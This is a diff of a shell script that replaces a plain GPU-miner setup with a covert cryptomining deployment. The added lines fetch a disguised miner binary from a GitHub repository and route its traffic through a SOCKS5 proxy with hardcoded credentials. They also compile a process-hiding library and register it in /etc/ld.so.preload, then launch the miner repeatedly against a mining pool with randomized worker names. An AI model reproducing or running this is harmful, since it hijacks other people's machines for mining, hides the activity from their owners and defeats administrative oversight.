@@ -1,48 +1,59 @@
-#!/bin/bash 
-sudo mkdir -p ~/.ltc/nvid
-cd ~/.ltc/nvid
-wget https://github.com/develsoftware/GMinerRelease/releases/download/3.05/gminer_3_05_linux64.tar.xz
-tar xf gminer_3_05_linux64.tar.xz
-sudo apt-get update < "/dev/null"
-sudo apt-get install linux-headers-$(uname -r)
-set -e
-yum_url="https://developer.download.nvidia.com/compute/cuda/opensource/11.7.1"
-deb_url="https://developer.download.nvidia.com/compute/cuda/opensource/11.7.1"
-if cat /etc/*release | grep ^NAME | grep Ubuntu; then
-echo "-----------------------------------------------"
-echo "Installing packages $deb_url on Ubuntu"
-wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
-sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
-wget https://developer.download.nvidia.com/compute/cuda/11.7.1/local_installers/cuda-repo-ubuntu2004-11-7-local_11.7.1-515.65.01-1_amd64.deb
-sudo dpkg -i cuda-repo-ubuntu2004-11-7-local_11.7.1-515.65.01-1_amd64.deb || true
-sudo cp /var/cuda-repo-ubuntu2004-11-7-local/cuda-*-keyring.gpg /usr/share/keyrings/
-sudo apt-get update || true
-sudo apt-get -y install cuda || true
-elif cat /etc/*release | grep ^NAME | grep Red; then
-echo "-----------------------------------------------"
-echo "Installing packages $yum_url on CentOS"
-wget https://developer.download.nvidia.com/compute/cuda/11.7.1/local_installers/cuda-repo-rhel7-11-7-local-11.7.1_515.65.01-1.x86_64.rpm
-sudo rpm -i cuda-repo-rhel7-11-7-local-11.7.1_515.65.01-1.x86_64.rpm
-sudo yum clean all
-sudo yum -y install nvidia-driver-latest-dkms
-sudo yum -y install cuda
-elif cat /etc/*release | grep ^NAME | grep Red; then
-echo "-----------------------------------------------"
-echo "Installing packages $yum_url"
-wget https://developer.download.nvidia.com/compute/cuda/11.7.1/local_installers/cuda-repo-rhel8-11-7-local-11.7.1_515.65.01-1.x86_64.rpm
-sudo rpm -i cuda-repo-rhel8-11-7-local-11.7.1_515.65.01-1.x86_64.rpm
-sudo dnf clean all
-sudo dnf -y module install nvidia-driver:latest-dkms
-sudo dnf -y install cuda
-else
-echo "-----------------------------------------------"
-echo "OS NOT DETECTED,installing Debian"
-wget https://developer.download.nvidia.com/compute/cuda/11.7.1/local_installers/cuda-repo-debian11-11-7-local_11.7.1-515.65.01-1_amd64.deb
-sudo dpkg -i cuda-repo-debian11-11-7-local_11.7.1-515.65.01-1_amd64.deb
-sudo cp /var/cuda-repo-debian11-11-7-local/cuda-*-keyring.gpg /usr/share/keyrings/
-sudo apt-get update
-sudo apt-get -y install cuda
-fi
-exit 0
-./miner --algo etchash --server etc.poolbinance.com:443 --user annora.Rig0
-pause
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo " "
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX 
+
+./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX
